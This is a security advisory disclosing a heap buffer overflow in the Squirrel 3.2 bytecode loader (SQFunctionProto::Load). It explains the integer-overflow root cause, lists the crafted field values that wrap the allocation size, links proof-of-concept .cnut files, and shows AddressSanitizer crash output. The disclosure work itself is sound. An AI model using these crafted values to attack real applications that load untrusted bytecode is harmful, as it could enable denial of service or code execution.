## CVE-2026-8261: Heap buffer overflow in SQFunctionProto::Load via integer overflow in _FUNC_SIZE (nlineinfos)

SQFunctionProto::Load() (squirrel/sqobject.cpp) reads count fields from the
bytecode stream without validation.  The counts are passed to
SQFunctionProto::Create() which computes the total allocation via the
_FUNC_SIZE macro (sqfuncproto.h:55-59).  On 64-bit, a cross-term integer
overflow between nlineinfos and ndefaultparams causes _FUNC_SIZE to wrap to a
tiny value, allocating a ~248-byte buffer.  The subsequent SafeRead at line
538 then attempts to write sizeof(SQLineInfo)*nlineinfos bytes into this tiny buffer leading heap buffer overflow.

The vulnerability is reachable from sq_static (or any embedder calling
sqstd_loadfile / sq_readclosure) by loading a crafted .cnut bytecode file.

- Version: Squirrel 3.2 stable
- Commit:  f9267f2


### Root cause (sqfuncproto.h:55-59, sqobject.cpp:493-538):

_FUNC_SIZE macro computes allocation size:
```c
  #define _FUNC_SIZE(ni,nl,nli,ndi,np,no,nlo,ndf) (sizeof(SQFunctionProto) \
      +((ni-1)*sizeof(SQInstruction))+(nl*sizeof(SQObjectPtr)) \
      +(nli*sizeof(SQLineInfo)) \
      +(ndi*sizeof(SQInteger))+(np*sizeof(SQObjectPtr)) \
      +(no*sizeof(SQOuterVar))+(nlo*sizeof(SQLocalVarInfo)) \
      +(ndf*sizeof(SQInteger)))
```
  Crafted values:
    nlineinfos     = 0x0800000000000000
    ndefaultparams = 0x1000000000000002

  _FUNC_SIZE contributions (64-bit, sizeof(SQLineInfo)=16, sizeof(SQInteger)=8):
    nli*sizeof(SQLineInfo)     = 0x0800000000000000 * 16 = 0x8000000000000000
    ndf*sizeof(SQInteger)      = 0x1000000000000002 * 8  = 0x8000000000000010

  Sum wraps: 0x8000000000000000 + 0x8000000000000010 = 0x10 (mod 2^64)

  Total allocation = sizeof(SQFunctionProto) + 0x10 = 248 bytes.

  Then at sqobject.cpp:538:
    `SafeRead(v,read,up,f->_lineinfos,sizeof(SQLineInfo)*nlineinfos);`
  passes 0x8000000000000000 to fread, which writes all remaining file data
  into the 248-byte buffer — heap buffer overflow.


## Proof-of-concept

The bug can be reached from two different paths. We provide two crafted .cnut bytecode files but the root cause is the same:

- [poc_intovf_lineinfos.cnut](https://github.com/biniamf/pocs/tree/main/squirrel-sqobject-functionproto-load-intovf-lineinfos)
- [poc_intovf_instr.cnut](https://github.com/biniamf/pocs/tree/main/squirrel-sqobject-functionproto-load-intovf-lineinfos)

```bash
sq_static poc_intovf_lineinfos.cnut
```

ASan output using one of the poc files:
```bash
squirrel/sqfuncproto.h:89:47: runtime error: pointer index expression with base 0xe13bd85e08a8 overflowed to 0x8000e13bd85e08a8
=================================================================
==160703==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xe13bd85e08b8 at pc 0xe42bda21f4cc bp 0xffffd97d7670 sp 0xffffd97d6e50
WRITE of size 512 at 0xe13bd85e08b8 thread T0
    #0 0xe42bda21f4c8 in fread ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:1030
    #1 0xb6d032cd8260 in fread /usr/include/aarch64-linux-gnu/bits/stdio2.h:331
    #2 0xb6d032cd8260 in sqstd_fread /home/roo/Desktop/squirrel/squirrel/sqstdlib/sqstdio.cpp:21
    #3 0xb6d032cd82c0 in file_read(void*, void*, long long) /home/roo/Desktop/squirrel/squirrel/sqstdlib/sqstdio.cpp:331
    #4 0xb6d032c68d8c in SafeRead(SQVM*, long long (*)(void*, void*, long long), void*, void*, long long) /home/roo/Desktop/squirrel/squirrel/squirrel/sqobject.cpp:296
    #5 0xb6d032c6c62c in SQFunctionProto::Load(SQVM*, void*, long long (*)(void*, void*, long long), SQObjectPtr&) /home/roo/Desktop/squirrel/squirrel/squirrel/sqobject.cpp:538
    #6 0xb6d032c6ccdc in SQClosure::Load(SQVM*, void*, long long (*)(void*, void*, long long), SQObjectPtr&) /home/roo/Desktop/squirrel/squirrel/squirrel/sqobject.cpp:395
    #7 0xb6d032bffc64 in sq_readclosure /home/roo/Desktop/squirrel/squirrel/squirrel/sqapi.cpp:1284
    #8 0xb6d032cd9994 in sqstd_loadfile /home/roo/Desktop/squirrel/squirrel/sqstdlib/sqstdio.cpp:356
    #9 0xb6d032bee7f0 in getargs /home/roo/Desktop/squirrel/squirrel/sq/sq.c:175
    #10 0xb6d032bef830 in main /home/roo/Desktop/squirrel/squirrel/sq/sq.c:330
    #11 0xe42bd95a2598 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #12 0xe42bd95a2678 in __libc_start_main_impl ../csu/libc-start.c:360
    #13 0xb6d032bed8ec in _start (/home/roo/Desktop/squirrel/squirrel/build/bin/sq_static+0x22d8ec) (BuildId: 77438f9a7bb01fa2bb5242d5f1987561c719aa3f)

0xe13bd85e08b8 is located 0 bytes after 248-byte region [0xe13bd85e07c0,0xe13bd85e08b8)
allocated by thread T0 here:
    #0 0xe42bda29a578 in malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:67
    #1 0xb6d032c63da4 in sq_vm_malloc(unsigned long long) /home/roo/Desktop/squirrel/squirrel/squirrel/sqmem.cpp:6
    #2 0xb6d032c51d50 in SQFunctionProto::Create(SQSharedState*, long long, long long, long long, long long, long long, long long, long long, long long) /home/roo/Desktop/squirrel/squirrel/squirrel/sqfuncproto.h:76
    #3 0xb6d032c6bbc8 in SQFunctionProto::Load(SQVM*, void*, long long (*)(void*, void*, long long), SQObjectPtr&) /home/roo/Desktop/squirrel/squirrel/squirrel/sqobject.cpp:499
    #4 0xb6d032c6ccdc in SQClosure::Load(SQVM*, void*, long long (*)(void*, void*, long long), SQObjectPtr&) /home/roo/Desktop/squirrel/squirrel/squirrel/sqobject.cpp:395
    #5 0xb6d032bffc64 in sq_readclosure /home/roo/Desktop/squirrel/squirrel/squirrel/sqapi.cpp:1284
    #6 0xb6d032cd9994 in sqstd_loadfile /home/roo/Desktop/squirrel/squirrel/sqstdlib/sqstdio.cpp:356
    #7 0xb6d032bee7f0 in getargs /home/roo/Desktop/squirrel/squirrel/sq/sq.c:175
    #8 0xb6d032bef830 in main /home/roo/Desktop/squirrel/squirrel/sq/sq.c:330
    #9 0xe42bd95a2598 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #10 0xe42bd95a2678 in __libc_start_main_impl ../csu/libc-start.c:360
    #11 0xb6d032bed8ec in _start (/home/roo/Desktop/squirrel/squirrel/build/bin/sq_static+0x22d8ec) (BuildId: 77438f9a7bb01fa2bb5242d5f1987561c719aa3f)

SUMMARY: AddressSanitizer: heap-buffer-overflow /usr/include/aarch64-linux-gnu/bits/stdio2.h:331 in fread
Shadow bytes around the buggy address:
  0xe13bd85e0600: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa
  0xe13bd85e0680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0xe13bd85e0700: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0xe13bd85e0780: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00
  0xe13bd85e0800: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0xe13bd85e0880: 00 00 00 00 00 00 00[fa]fa fa fa fa fa fa fa fa
  0xe13bd85e0900: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xe13bd85e0980: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xe13bd85e0a00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xe13bd85e0a80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0xe13bd85e0b00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==160703==ABORTING
```

Impact:

  - Immediate:  DoS
  - Potential:  Heap buffer overflow with attacker-controlled content.
                Exploitable for arbitrary code execution.
  - Scope:      Any application using sqstd_loadfile or sq_readclosure to load
                bytecode from untrusted sources.
